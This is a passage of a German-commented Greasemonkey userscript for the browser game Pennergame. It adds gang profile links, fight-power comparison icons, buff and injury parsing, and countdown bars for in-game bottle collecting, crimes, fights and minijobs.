        return content.split('<a href="/gang/fight/view/').length - 1;

    } catch(err) {
        GM_log("Fehler beim Ermitteln der Zahl von Bandenkämpfen: " + err);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt den Bandennamen aus einer übergebenen Tabellenzeile
// **********************************************************************************
// **********************************************************************************
function GetGangnameFromTable(gangtr) {
    try {
        // Inhalt der ersten Zelle auslesen
        var gangname = gangtr.getElementsByTagName("td")[0].innerHTML;
        if (gangname.substr(0,4) == "<div")
            gangname = gangtr.getElementsByTagName("td")[0].getElementsByTagName("div")[0].innerHTML;
        // "&nbsp;" am Anfang entfernen und Wert zurückgeben
        gangname = gangname.substr(6);

        return gangname;
    } catch(err) {
        GM_log("Fehler beim Ermitteln des Bandennamens: " + err);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die Banden-IDs und überführt die Bandennamen in Links auf die
// Bandenprofile
// **********************************************************************************
// **********************************************************************************
function LinkifyGangnames(gangtr) {

    // Ermitteln des Bandennamens aus der aktuellen Tabellenzeile
    var gangname = GetGangnameFromTable(gangtr);

    // Wenn der Bandenname nicht die Benachrichtigung über "keine laufenden Kämpfe" ist
    if (gangname.indexOf(TxtNoGangFights[lang]) == -1) {
        // Für die Suche werden Spaces durch "+" ersetzt
        var gangnamesearch = gangname.replace(/ /g, "+");
        while (gangnamesearch.length < 4)
            gangnamesearch += "%";
        gangnamesearch = gangnamesearch.replace(/&amp;/g, "%26");
// Weitere Zeichenersetzungen, die noch getestet werden müssen
//        gangnamesearch = gangnamesearch.replace(/$/g, "%24");
//        gangnamesearch = gangnamesearch.replace(/@/g, "%40");
//        gangnamesearch = gangnamesearch.replace(/+/g, "%2B");

        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Abrufen der Bandensuchseite
        // **********************************************************************************
        GM_xmlhttpRequest({method: 'GET', url: GANGSEARCH_URL + gangnamesearch + "&min=&max=", onload: function(responseDetails) {
                try {
                    // Content der Bandensuchseite speichern
                    var content = responseDetails.responseText;


                    // Extrahieren der Banden-ID
                    var gangid = content.split('hs_bande')[1];
                    gangid = gangid.split('</table>')[0];

                    gangname = gangname.replace(/&amp;/g, "&");

                    if (gangid.indexOf(gangname) != -1) {
                        gangid = gangid.split('/">' + gangname + '</a>')[0];
                        gangid = gangid.split(":");
                        gangid = gangid[gangid.length - 1];

                        // Zusammenbauen eines Links auf das Bandenprofil und in die aktuelle Tabellenzeile einfügen (Ersetzen des Textes)
                        gangtr.getElementsByTagName("td")[0].innerHTML = '&nbsp;<a href="/profil/bande:' + gangid + '/" target="_blank">' + gangname + '</a>';
                    } else {
                        GM_log("Bandenname '" + gangname + "' konnte im HS nicht gefunden werden.");
                    }
                } catch (err) {
                    GM_log("Fehler beim Verlinken des gegnerischen Bandenprofils: " + err);
                }
            }
        });
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion liefert vom String str die rechtesten n Zeichen zurück
// ***********************************************************************************************
// ***********************************************************************************************
function Right$(str, n){
    if (n <= 0)
        return "";
    else if (n > String(str).length)
        return str;
    else {
        var iLen = String(str).length;
        return String(str).substring(iLen, iLen - n);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob die aktuelle Seite die Plunderseite ist
// **********************************************************************************
// **********************************************************************************
function IsPlunderPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn es sich bei der aktuellen Seite um die Plunderseite handelt
    if (Right$(currentURL, 23) == "/stock/plunder/?success" || Right$(currentURL, 15) == "/stock/plunder/") {
        // True zurückgeben
        return true;
    } else {
        // False zurückgeben
        return false;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob die aktuelle Seite die Bastelseite ist
// **********************************************************************************
// **********************************************************************************
function IsCraftPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn es sich bei der aktuellen Seite um die Plunderseite handelt
    if (currentURL.indexOf("/craft/?status=") != -1  || Right$(currentURL, 7) == "/craft/") {
        // True zurückgeben
        return true;
    } else {
        // False zurückgeben
        return false;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob die aktuelle Seite die Loseseite ist
// **********************************************************************************
// **********************************************************************************
function IsGamePage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn es sich bei der aktuellen Seite um die Loseseite handelt
    if (currentURL.indexOf("/city/games/") != -1) {
        // True zurückgeben
        return true;
    } else {
        // False zurückgeben
        return false;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob die aktuelle Seite die V-Waffenseite ist
// **********************************************************************************
// **********************************************************************************
function IsDefWeaponPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn es sich bei der aktuellen Seite um die V-Waffenseite handelt
    if (currentURL.indexOf("/city/weapon_store/def/") != -1) {
        // True zurückgeben
        return true;
    } else {
        // False zurückgeben
        return false;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob die aktuelle Seite die Nachrichtenseite ist
// **********************************************************************************
// **********************************************************************************
function IsMessagesPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn es sich bei der aktuellen Seite um die Nachrichtenseite handelt
    if (Right$(currentURL, 10) == "/messages/") {
        // True zurückgeben
        return true;
    } else {
        // False zurückgeben
        return false;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt, ob die aktuelle Seite die fight-Seite "*/fight/" ist
// **********************************************************************************
// **********************************************************************************
function IsFightPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn die aktuelle Seiten-URL mit "/fight/" endet: True zurückgeben
    return (Right$(currentURL, 12) != "/gang/fight/" && Right$(currentURL, 7) == "/fight/");
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt, ob die aktuelle Seite die overview-Seite "*/overview/" ist
// **********************************************************************************
// **********************************************************************************
function IsOverviewPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn die aktuelle Seiten-URL mit "/overview/" endet: True zurückgeben
    return (Right$(currentURL, 10) == "/overview/" && Right$(currentURL, 16) != "/fight/overview/");
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt, ob die aktuelle Seite die Bandenkampfseite "*/gang/fight/"
// ist (nur dort soll LinkifyGangnames wirken)
// **********************************************************************************
// **********************************************************************************
function IsFightOverviewPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    // Wenn die aktuelle Seiten-URL mit "/gang/fight/" endet: true zurückgeben
    return (Right$(currentURL, 12) == "/gang/fight/");
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt, ob die aktuelle Seite die gang-Seite "*/gang/" ist
// **********************************************************************************
// **********************************************************************************
function IsGangPage() {
    // Aktuelle Seiten-URL ermitteln
    var currentURL = location.toString();

    var page = 0;
    if (oldVersion) {
        // Wenn die aktuelle Seiten-URL mit "/gang/" oder "/gang/xxx/" endet: xxx zurückgeben
        if (Right$(currentURL, 6) == "/gang/")
            return 1;

        for (var pos = currentURL.length - 2; pos > 0; pos--)
            if (isNaN(currentURL.substr(pos, 1))) {
                if (Right$(currentURL.substr(0, pos+1), 6) == "/gang/")
                    page = currentURL.substr(pos+1, currentURL.length - pos - 2);
                break;
            }
    } else {
        var pos = document.getElementsByTagName("html")[0].innerHTML.indexOf('class="pagebutton"');
        if (pos > 0) {
            var tpage = document.getElementsByTagName("html")[0].innerHTML.substr(pos,100).split('>')[1].split('<')[0].split(' ')[1];
            if (!isNaN(tpage))
                page = Number(tpage);
        }
    }
    return page;
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt, ob es Neuigkeiten beim Bandenkampf gibt
// **********************************************************************************
// **********************************************************************************
function CheckNewsFromGangFight(GangFightInfo) {
    var currentGangFightInfo = PGu_getValue("GangFightInfo","");

    // Wenn sich die Info geändert hat
    if (currentGangFightInfo != GangFightInfo) {
        // Setze das Änderungsflag
        PGu_setValue("GangFightInfoFlag", true);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion setzt die Neuigkeiten vom Bandenkampf zurück
// **********************************************************************************
// **********************************************************************************
function ResetNewsFromGangFight(GangFightInfo) {
    // Setze GangFightInfo auf den aktuellen Stand
    PGu_setValue("GangFightInfo", GangFightInfo);
    // Setze das Flag zurück
    PGu_setValue("GangFightInfoFlag", false);
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion ermittelt den ATT- oder DEF-Wert aus der übergebenen Zeile
// ***********************************************************************************************
// ***********************************************************************************************
function GetValueFromRow(currenttr) {
    return currenttr.getElementsByTagName("td")[1].innerHTML.split("<a class")[0];
}

// **********************************************************************************
// **********************************************************************************
// Funktion wandelt einen HTML-Content in ein DOM um
// **********************************************************************************
// **********************************************************************************
function HTML2DOM(content) {

    var dummyDiv = document.createElement('div');
    dummyDiv.innerHTML = content;

    return dummyDiv;
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion überprüft, ob eine ATT-Steigerung vorliegt
// ***********************************************************************************************
// ***********************************************************************************************
function HasATTBoost(content) {
    var doc = HTML2DOM(content);
    var buffs = doc.getElementsByClassName("style_buff");

    // Wenn die Klasse vorhanden ist, die Steigerungen beinhaltet
    if (buffs.length > 0) {
        // Wenn im Text "ATT" oder "DEF" vorkommt (ist beim Minibrunnen nicht der Fall)
        if (buffs[0].parentNode.innerHTML.indexOf(TxtATTBoost[lang]) != -1 || buffs[0].parentNode.innerHTML.indexOf(TxtDEFBoost[lang]) != -1) {
            return true;
        // sonst: Im Text kommt nicht "ATT" vor (ist beim Minibrunnen der Fall)
        } else {
            return false;
        }
    // sonst: Die Klasse, die Steigerungen beinhaltet, ist nicht vorhanden
    } else {
        return false;
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion ermittelt die Höhe der ATT-Steigerung
// ***********************************************************************************************
// ***********************************************************************************************
function GetATTBoost(content) {

    // Wenn eine ATT-Stärkung vorliegt
    if (HasATTBoost(content)) {
        var attboost = content.split("<span><b>" + TxtBoost[lang] + "</b>")[1];
        if (attboost.indexOf(TxtATTBoost[lang]) != -1) {
            attboost = attboost.split(TxtATTBoost[lang])[1];
            attboost = attboost.split("<br")[0];
            return attboost;
        }
        else {
            return 0;
        }
    // sonst: Es liegt keine ATT-Stärkung vor
    } else {
        return 0;
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion überprüft, ob eine Verletzung vorliegt
// ***********************************************************************************************
// ***********************************************************************************************
function HasInjury(content) {
    var doc = HTML2DOM(content);
    var buffs = doc.getElementsByClassName("style_injury");

    // Wenn die Klasse vorhanden ist, die Verletzungen beinhaltet
    if (buffs.length > 0) {
        // Wenn im Text "ATT" oder "DEF" vorkommt
        if (buffs[0].parentNode.innerHTML.indexOf(TxtATTBoost[lang]) != -1 || buffs[0].parentNode.innerHTML.indexOf(TxtDEFBoost[lang]) != -1) {
            return true;
        // sonst: Im Text kommt nicht "ATT" oder "DEF" vor
        } else {
            return false;
        }
    // sonst: Die Klasse, die Verletzungen beinhaltet, ist nicht vorhanden
    } else {
        return false;
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion ermittelt die Höhe der ATT-Schwächung
// ***********************************************************************************************
// ***********************************************************************************************
function GetInjury(content) {

    // Wenn eine ATT/DEF-Schwächung vorliegt
    if (HasInjury(content)) {
        var injboost = content.split("<span><b>" + TxtInjury[lang] + "</b>")[1];
        if (injboost.indexOf(TxtATTBoost[lang]) != -1) {
            injboost = injboost.split(TxtATTBoost[lang])[1];
            injboost = injboost.split("<br")[0];
            return injboost;
        }
        else if (injboost.indexOf(TxtDEFBoost[lang]) != -1) {
            injboost = injboost.split(TxtDEFBoost[lang])[1];
            injboost = injboost.split("<br")[0];
            return injboost;
        }
        else {
            return 0;
        }
    // sonst: Es liegt keine ATT/DEF-Schwächung vor
    } else {
        return 0;
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Funktion ermittelt die Höhe der DEF-Steigerung
// ***********************************************************************************************
// ***********************************************************************************************
function GetDEFBoost(content) {
    // Wenn eine DEF-Stärkung vorliegt
    if (HasATTBoost(content)) {
        var defboost = content.split("<span><b>" + TxtBoost[lang] + "</b>")[1];
        if (defboost.indexOf(TxtDEFBoost[lang]) != -1) {
            defboost = defboost.split(TxtDEFBoost[lang])[1];
            defboost = defboost.split("<br>")[0];
            return defboost;
        } else {
            return 0;
        }
    // sonst: Es liegt keine DEF-Stärkung vor
    } else {
        return 0;
    }
}

// ***********************************************************************************************
// ***********************************************************************************************
// Baut Zusatzinfo zusammen
// ***********************************************************************************************
// ***********************************************************************************************
function makeAddInfo() {
    var addInfo = "";
    if (weaponcheck1 != "" && weaponcheck1 != undefined)
        addInfo += ' ' + weaponcheck1 + '.';
    if (weaponcheck2 != "" && weaponcheck2 != undefined)
        addInfo += ' ' + weaponcheck2 + '.';
    if (homecheck != "" && homecheck != undefined)
        addInfo += ' ' + homecheck + '.';
    if (plundercheck != "" && plundercheck != undefined)
        addInfo += ' ' + plundercheck + '.';
    return addInfo;
}

// ***********************************************************************************************
// ***********************************************************************************************
// Berechnet aus ATT und DEF die Kampfkraft
// ***********************************************************************************************
// ***********************************************************************************************
function GetPower(attvalue, defvalue) {
    return (Number(attvalue) * 1.1 + Number(defvalue)).toFixed(2);
}

// **********************************************************************************
// **********************************************************************************
// Vergleicht die aktuelle Stärke mit der Max-Stärke und setzt das richtige Icon
// **********************************************************************************
// **********************************************************************************
function ComparePower(attvalue, defvalue, promille) {

    // Kampfkraft errechnen
    var fightpower = GetPower(attvalue, defvalue)

    // Auslesen des bisherigen Maximalwertes
    var powermaxvalue = Number(PGu_getValue("PowerMaxValue", 0));

    // Wenn die aktuelle Kampfkraft größer als der bisherige Maximalwert ist
    if (fightpower > powermaxvalue) {
        // Größte Kampfkraft hochsetzen
        PGu_setValue("PowerMaxValue", fightpower.toString());
    }

    // Wenn der Promillewert zu hoch ist
    if (promille >= 4) {
        ShowFightStateIcon(FIGHTSTATE_DANG, fightpower, powermaxvalue);
    // Wenn die aktuelle Kampfkraft größer oder gleich der bislang größten ist
    } else if (fightpower >= powermaxvalue || bl("fi")) {
        ShowFightStateIcon(FIGHTSTATE_OK, fightpower, powermaxvalue);
    // sonst: Die aktuelle Kampfkraft ist kleiner als die bislang größte
    } else {
        ShowFightStateIcon(FIGHTSTATE_WEAK, fightpower, powermaxvalue);
        logoutWarn = 2;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt den Handler zum Trikotanzeige ausschalten ein
// **********************************************************************************
// **********************************************************************************
function TrikotAusHandler(currentelem) {
    currentelem.style.cursor = 'pointer';

    // **********************************************************************************
    // EVENTHANDLER
    // **********************************************************************************
    currentelem.addEventListener('click', function(event) {
                            PGu_setValue("TrikotanzeigeAus", 1);
                            refreshPage();
    },false);
}

// **********************************************************************************
// **********************************************************************************
// Funktion gibt eine Meldung aus
// **********************************************************************************
// **********************************************************************************
function showMsg(title, text, pic){        //meldung - ueberschrift, hinweistext, bild
    window.setTimeout("PgFunction.showMsg($('notifyme'), '"+title+"', '<b>"+text+"</b>', '"+pic+"')", 500);
}

// **********************************************************************************
// **********************************************************************************
// Funktion erzeugt eine formatierte Zeitangabe
// **********************************************************************************
// **********************************************************************************
function FmtInfo(jetzt, end_time) {
    if (jetzt > 0) {
        var rest = end_time - jetzt;
        if (rest <= 0)
            rest = "0:00";
        else {
            var days = Math.floor(rest/86400);
            var hours = Math.floor((rest % 86400)/3600);
            var mins = Math.floor((rest % 3600)/60);
            var secs = rest % 60;
            secs = ":" + Right$(secs + 100,2);
            if (hours != 0 || days != 0)
                mins = ":" + Right$(mins+100, 2);
            if (days != 0)
                hours = ":" + Right$(hours+100, 2);
            else {
                days = "";
                if (hours == "0")
                    hours = "";
                }
            rest = days + hours + mins + secs;
        }
    }
    else
        var rest = "";
    var enddate = new Date();
    enddate.setTime(end_time * 1000);
    return rest + getLangTxt(TxtEnd) + FormatDate(enddate) + " " + FormatTime(enddate);
}

// **********************************************************************************
// **********************************************************************************
// Funktion erzeugt einen Zeitbalken mit Restzeitanzeige
// **********************************************************************************
// **********************************************************************************
function DispZeit(jetzt, cnt, url, Txt, back, id, x, y, z, maxTime, maxwidth) {
    function mod (a, b) { return a - Math.floor(a/b)*b; }
    if (cnt.innerHTML.indexOf("counter") == -1)
        var rtime = 0;
    else
        var rtime = Number(cnt.innerHTML.split("counter(")[1].split(")")[0]);
    jetzt = Math.floor(jetzt.getTime()/1000);
    var end_time = jetzt + rtime;
    var minuten = mod(Math.floor(rtime/60), 60) + 100 + ":";
    var text = getLangTxt(Txt);
    if (text.indexOf("%ds") != -1) {
        text = text.replace("%ds", "%s");
        var tage = Math.floor(rtime/86400);
        tage = (tage == 0 ? "": tage + " Tag" + (tage != 1?"e":"") + " ");
        var stunden = Math.floor(mod(rtime, 86400)/3600) + ":";
    }
    else {
        var tage = "";
        var stunden = Math.floor(rtime/3600) + ":";
    }
    var sekunden = mod(rtime, 60) + 100 + "";
    var zeit = tage + stunden + minuten.slice(1) + sekunden.slice(1);
    var enddate = new Date();
    enddate.setTime(end_time * 1000);
    enddate = FormatDate(enddate) + " " + FormatTime(enddate);
    text = printf(text, zeit, enddate);
    if (!document.getElementById(back+"img"))
        return;
    var width = Math.ceil(maxwidth / maxTime * rtime);
    ShowImg (back, url, ICON_PLUNDERB, text, maxwidth, 5, x, y, z, id+'bg');
    if (width > 0)
        ShowImg (back, url, ICON_CLEAN, text, width, 5, x, y, z+1, id+'fg');
    var actTime = function () {
        var now = new Date();
        now = Math.floor(now.getTime()/1000);
        var rtime2 = rtime - (now - jetzt);
        var minuten = mod(Math.floor(rtime2/60), 60) + 100 + ":";
        var text = getLangTxt(Txt);
        if (text.indexOf("%ds") != -1) {
	        text = text.replace("%ds", "%s");
	        var tage = Math.floor(rtime2/86400);
	        tage = tage + " Tag" + (tage != 1?"e":"") + " ";
	        var stunden = Math.floor(mod(rtime2, 86400)/3600) + ":";
        }
        else {
	        var tage = "";
            var stunden = Math.floor(rtime2/3600) + ":";
        }
        var sekunden = mod(rtime2, 60) + 100 + "";
        var zeit = tage + stunden + minuten.slice(1) + sekunden.slice(1);
        text = printf(text, zeit, enddate);
        document.getElementById(id+'bg').title = text;
        if (document.getElementById(id+'fg'))
            document.getElementById(id+'fg').title = text;
    }
    document.getElementById(id+'bg').addEventListener('mouseover', actTime, false);
    if (document.getElementById(id+'fg'))
        document.getElementById(id+'fg').addEventListener('mouseover', actTime, false);
    var actBalk = function () {
        var now = new Date();
        now = Math.floor(now.getTime()/1000);
        var rtime2 = rtime - (now - jetzt);
        if (rtime2 <= 0) {
            refreshPage();
            return;
        }
        var nwidth = Math.ceil(maxwidth/maxTime*rtime2);
        if (document.getElementById(id+'fg'))
            document.getElementById(id+'fg').width = nwidth;
        var nextDecr = Math.floor(mod(rtime2, maxTime/maxwidth) * 1000);
        if (nextDecr < 500)
            nextDecr = 500;
        window.setTimeout(actBalk, nextDecr);
    }
    if (rtime > 0) {
        var nextDecr = Math.floor(mod(rtime, maxTime/maxwidth) * 1000);
        if (nextDecr < 500)
            nextDecr = 500;
        window.setTimeout(actBalk, nextDecr);
    }
}
// **********************************************************************************
// **********************************************************************************
// Funktion zeigt den Minijob an
// **********************************************************************************
// **********************************************************************************
function ShowMiniJob(contover) {
    // Aus HTML ein DOM-Objekt erzeugen
    var doc = HTML2DOM(contover);
    var el = doc.getElementsByClassName("double");
    if (el.length < 2)
        return;
    var div = el[el.length-2];
    if (div.innerHTML.indexOf("/overview/music_payout/") == -1)
        return;
    var job = div.getElementsByTagName("li")[0].innerHTML;
    var money = div.getElementsByTagName("li")[2].getElementsByTagName("input")[0].value.split(" ")[0];
    var titletext = div.getElementsByTagName("h4")[0].innerHTML + ": " + job + ", Verdienst bisher: " + money;
    var img = div.getElementsByTagName("img")[0].src;
    ShowImg('ADBACK', MINIJOBS_URL, img, titletext, 30, 34, 85, 11, 1, 'defweapon');
    div = el[el.length-1];
    var li = div.getElementsByTagName("li");
    var timetext = li[li.length-1].innerHTML.replace("<br>", "");
    if (timetext.indexOf('"rot"') == -1) {
        var t1 = timetext.split(">")[0].split("<")[0];
        var t2 = timetext.split(">")[2];
        var txt = new Array(t1+"%ds"+t2+"(%s)");
    }
    else {
        var txt = new Array(timetext.split(">")[2].split("<")[0]);
    }
    var jetzt = new Date();
	
    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Abfragen der Abholzeit des Minijobs
    // **********************************************************************************
    GM_xmlhttpRequest({method:"GET", url: MINIJOBS_URL, onload:function(responseDetails) {
            var content = responseDetails.responseText;

            // Aus HTML ein DOM-Objekt erzeugen
            var doc = HTML2DOM(content);

            var tables = doc.getElementsByTagName("table");
            for (var i = 0; i < tables.length; i++) {
                // Referenz auf Tabellenzeilen in trs speichern
                var trs = tables[i].getElementsByTagName("tr");
                if (trs.length == 0)
                    continue;
                var tds = trs[0].getElementsByTagName("td");
                if (tds.length < 2)
                    continue;
                var spans = tds[1].getElementsByTagName("span");
                if (spans.length == 0)
                    continue;
                if (spans[0].innerHTML != job)
                    continue;
                var text = trs[1].innerHTML.split("<b>")[1];
                text = text.split("</b>")[0];
                var menge = text.match(/\d+ \w+/);
                if (menge.length == 0)
                    continue;
                var dauer = menge[0].split(" ");
                dauer = dauer[0] * (dauer[1] == "Tage"?86400:3600);
                DispZeit(jetzt, li[li.length-1], MINIJOBS_URL, txt, "ADBACK", "minijob", 85, 47, 1, dauer, 34);
                break;
            }
        }
    });
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt die aktuellen Skillwerte etc.
// **********************************************************************************
// **********************************************************************************
function GetAllValues(attvalue, defvalue) {
    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Abfragen des Flaschensammelstatus
    // **********************************************************************************
    GM_xmlhttpRequest({method:"GET", url: TOWNBASE_URL+'activities/', onload:function(responseDetails) {
            function cart_leeren(){
                GM_xmlhttpRequest({
                	method: 'POST',
                	url: TOWNBASE_URL+'activities/bottle/',
                	headers: {'Content-type': 'application/x-www-form-urlencoded'},
                	data: encodeURI('bottlecollect_pending=True'),
                	onload: function(responseDetails) {
                        var content = responseDetails.responseText;
                		if (content.indexOf('my-profile') == -1){
                			cart_leeren()
                			return;
                		}
                        if (content.indexOf('name="xycoords"') != -1) {
                            if (content.indexOf('name="bottlecollect_pending"') == -1) {
                                var ntext = content.indexOf('id="ntext"');
                                var p1 = content.indexOf("<p>", ntext);
                                var p2 = content.indexOf("</p>", p1);
                                var menge = content.substring(p1, p2).match(/\d+/);
                                showMsg('Information', printf(getLangTxt(TxtEmptied), menge), 'bottle');
                                if (Right$(location.toString(), 18) == "activities/bottle/")
                                    window.setTimeout("window.location.href = window.location.protocol + '//' + window.location.host + '/activities/'", 2000);
                                else
                                    window.setTimeout("document.location.reload()", 2000);
                            }
                            else {
                                cart_leeren()
                                return;
                            }
                		}
                	}
                });
            }
            // **********************************************************************************
            // EVENTHANDLER
            // **********************************************************************************
            function event_empty(event) {
                var cart = document.getElementById('cart');
                cart.removeEventListener('click', event_empty, false);
                // Wartecursor anzeigen
                CursorWait(cart, true);
                cart_leeren();
            }

            var content = responseDetails.responseText;

            // Cleanliness ermitteln
            clpos = content.indexOf('<a class="tool');
            if (clpos < 0)
                return;
            var cltext = content.substr(clpos).split("|")[1].split(":")[1];
            clean = parseInt(cltext);

            if (content.indexOf('bottlecollect') != -1) {
                ShowImg ('SCBACK', '', ICON_REDBG, '', '', '', 84, 13, 4, 'cartbg');
                var cart = ShowImg ('SCBACK', '', ICON_CART, getLangTxt(TxtCart), 25, 25, 90, 20, 5, 'cart');
                if (cart == null)
                    return;
                cart.style.cursor = 'pointer';

                // **********************************************************************************
                // EVENTHANDLER
                // **********************************************************************************
                cart.addEventListener('click', function(event) {
                	// Wartecursor anzeigen
                	CursorWait(this, true);
                	cart_leeren();
                },false);
            } else {
                // auf der activities-Seite sind mehrere Counter der Art counter(x), wobei x die Restzeit ist
                // Counter 1: Weiterbildung (counters[1])
                // Counter 2: Kampf (counters[2])
                // Counter 3: Flaschensammeln (counters[3])
                // Counter 4: falls vorhanden: Flaschensammeln oder Verbrechen (counters[4]) oder sonstiges Event
                var counters = content.split("counter(");
                var posci = content.indexOf('enemy_counter_info');
                if (posci != -1)
                    posci = content.substr(posci+20,100).indexOf("counter");
                if (posci != -1) {
                    for (k=0; k< counters.length; k++)
                        if (counters[k].substr(0,2)==content.substr(posci+7,2)) {
                            counters.splice(k, 1);
                            break;
                        }
                }

                var fcounter = counters[2].split(")")[0];	// Kampfounter
                var counter = counters[3].split(")")[0];	// Flaschensammeln
                // in der letzten Tabelle steht der Verbrechenscounter
                var tables = content.split("<table");
                var crimetbl = tables[tables.length-1];
                var vcount = crimetbl.split("counter(");
                if (vcount.length <= 1)
                    var vcounter = 0;				        // kein Counter, also kein Verbrechen
                else
                    var vcounter = vcount[1].split(")")[0];	// Verbrechen-Counter

                var jetzt = new Date();
                jetzt = Math.floor(jetzt.getTime()/1000);
                if (counter != 0) {		// Flaschen werden gesammelt
                    var end_time = jetzt + Number(counter);
                    ShowImg ('SCBACK', TOWNBASE_URL+'activities/', ICON_NODEFWEAPON, '', '', '', 84, 13, 4, 'cartbg');
                    ShowImg ('SCBACK', TOWNBASE_URL+'activities/', ICON_CART, getLangTxt(TxtCart3) + " (" + FmtInfo(jetzt, end_time) + ")", 25, 25, 90, 20, 5, 'cart');
                } else {
                    if (vcounter > 0 && fcounter > 0)
                        var width = 19;
                    else
                        var width = 25;
                    if (vcounter != 0) {		// Verbrechen wird geplant
                        crimePlanned = 1;
                        var vend_time = jetzt + Number(vcounter);
                        if (promille > 0) {
                            var href = EAT_STACK;
                       	    ShowImg ('SCBACK', href, ICON_REDBG, '', (width==19?19:39), 39, 84 + (fcounter>0?20:0), 13, 4, 'cuffbg');
                            logoutWarn = 1;
                    	} else {
                            var href = TOWNBASE_URL+'activities/';
                            ShowImg ('SCBACK', href, ICON_NODEFWEAPON, '', (width==19?19:39), 39, 84 + (fcounter>0?20:0), 13, 4, 'cuffbg');
                        }
                        ShowImg ('SCBACK', href, ICON_CUFF, getLangTxt(TxtCrime) + " (" + FmtInfo(jetzt, vend_time) + ")" + (promille?getLangTxt(TxtCrimePro):""), width, 25, 84 + (fcounter>0?20:6), 20, 5, 'cuff');
                    }
                    if (fcounter > 0) {		// Kampf läuft
                        var fend_time = jetzt + Number(fcounter);
                        ShowImg ('SCBACK', FIGHT_URL, ICON_NODEFWEAPON, '', (width==19?19:39), 39, 84, 13, 4, 'fghtbg');
                        var text = getLangTxt(TxtFight).replace('%s', attname) + " (" + FmtInfo(jetzt, fend_time) + ")";
                        var alerttext = "";
                        if (attwarn == 1)
                            alerttext = " " + getLangTxt(TxtOwnGang);
                        else if (attwarn == 2)
                            alerttext = " " + getLangTxt(TxtAlliedGang);
                        if (attwarn > 0)
                            ShowImg ('SCBACK', FIGHT_URL, ICON_REDBG, alerttext, (width==19?19:39), 39, 84, 13, 4, 'fghtbg');
                        else
                            ShowImg ('SCBACK', FIGHT_URL, ICON_NODEFWEAPON, '', (width==19?19:39), 39, 84, 13, 4, 'fghtbg');

                        ShowImg ('SCBACK', FIGHT_URL, ICON_ATTACK, text + alerttext, width, 25, 84 + (vcounter>0?0:6), 20, 5, 'fght');
                        if (attwarn > 0 && PGu_getValue("attwarn", "") == "") {
                            PGu_setValue("attwarn", attid);
                            alert (alerttext);
                        }
                    }
                    else
                        PGu_setValue("attwarn", "");
                }
                if (counter != 0 || vcounter != 0 || fcounter > 0) {
                    PGu_setValue("collect", 0);
                    var CntDwn = function() {
                        var again = true;
                        var cart = document.getElementById('cart');
                        jetzt = jetzt + 1;
                        if (counter != 0) {		// Flaschen werden gesammelt
                            if (jetzt <= end_time)
                                var text = getLangTxt(TxtCart3) + " (" + FmtInfo(jetzt, end_time) + ")";
                            else {
                                again = false;
                                document.getElementById('cartbg').src = getIconAddr(ICON_REDBG);
                                var text = getLangTxt(TxtCart);
                                document.getElementById('cartbglnk').removeAttribute('href');
                                document.getElementById('cartlnk').removeAttribute('href');
                                cart.style.cursor = 'pointer';
                                // **********************************************************************************
                                // EVENTHANDLER
                                // **********************************************************************************
                                cart.addEventListener('click', event_empty, false);
                               	if (CollEndAlert == 1)
                                    alert(getLangTxt(TxtCollFinish));
                            }
                            if (cart)
                                cart.title = text;
                            else {
                                again = false;
                            }
                        } else {
                            if (vcounter > 0) {
                                var text = getLangTxt(TxtCrime) + " (" + FmtInfo(jetzt, vend_time) + ")" + (promille?getLangTxt(TxtCrimePro):"");
                                document.getElementById('cuff').title = text;
                            }
                            if (fcounter > 0) {
                                var text = getLangTxt(TxtFight).replace('%s', attname) + " (" + FmtInfo(jetzt, fend_time) + ")";
                                var alerttext = "";
                                if (attwarn == 1)
                                    alerttext = " " + getLangTxt(TxtOwnGang);
                                else if (attwarn == 2)
                                    alerttext = " " + getLangTxt(TxtAlliedGang);
                                var fght = document.getElementById('fght');
                                if (fght)
                                    fght.title = text + alerttext;
                                else {
                                    again = false;
                                }
                                if (attwarn > 0 && PGu_getValue("attwarn", "") == "") {
                                    PGu_setValue("attwarn", attid);
                                    alert (alerttext);
                                }
                            }
                            else
                                PGu_setValue("attwarn", "");
                        }
                        if (again)
                            window.setTimeout(CntDwn, 1000);
                    }
                    window.setTimeout(CntDwn, 1000);
                } else if (fcounter <= 0) {
                    ShowImg ('SCBACK', '', ICON_GRNBG, '', '', '', 84, 13, 4, 'cartbg');
                    var cart = ShowImg ('SCBACK', '', ICON_CART, getLangTxt(TxtCart2), 25, 25, 90, 20, 5, 'cart');
